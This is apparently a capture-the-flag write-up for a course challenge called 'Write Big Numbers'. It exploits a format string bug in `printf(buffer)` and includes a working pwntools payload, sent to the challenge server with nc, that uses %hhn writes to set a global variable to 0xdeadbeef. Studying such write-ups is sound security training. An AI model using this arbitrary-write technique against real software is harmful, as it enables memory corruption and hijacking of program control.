# Challenge `Write Big Numbers` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Format String Vulnerability (Arbitrary Memory Write)
- Where: Where is the vulnerability present
  - In `vuln()` function at `printf(buffer);`. The buffer is fully controlled by user input via `read()` in `main()`.
- Impact: What results of exploiting this vulnerability
  - An attacker can write arbitrary 32-bit values to memory. This enables bypassing security checks and fully controlling program logic. In this challenge, it allows setting target to 0xdeadbeef and retrieving the flag

## Steps to reproduce

1. Locate the target variable
```sh
nm 06_write_big_number | grep target
---------------
Output:
0804c044 B target
```
So we now know target is a global variable, located at address `0x0804c044`

2. Place each byte address on the stack and write the value incrementally.

Python exploit:
```py
python3 - << 'EOF' | nc mustard.stt.rnl.tecnico.ulisboa.pt 25196
from pwn import *
import sys

T = 0x0804c044

sys.stdout.buffer.write(
    p32(T+2) + p32(T+1) + p32(T+3) + p32(T) +
    b"%157x%7$hhn%17x%8$hhn%32x%9$hhn%17x%10$hhn"
)
EOF
```

4. Result: All four bytes of target are overwritten so that target == 0xdeadbeef. The success condition is met and the flag is printed.